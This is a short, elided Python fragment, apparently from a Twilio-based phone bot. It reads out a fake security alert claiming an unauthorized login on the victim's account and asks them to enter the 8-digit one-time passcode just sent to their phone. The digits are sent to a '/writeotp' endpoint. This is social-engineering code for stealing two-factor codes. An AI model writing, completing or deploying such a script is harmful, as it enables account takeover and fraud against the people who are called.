...
def gather():
    ...
    if 'Digits' in request.values:
        ...
        if choice == '1':
            gatherotp = Gather(num_digits='8', action='/writeotp', timeout=120)
            gatherotp.say(f'An unauthorized login has been detected on your {site} account. if this was not you. to secure your {site} account., please input the., 8 digit ,. one time pass code we have sent to your mobile phone now,.')
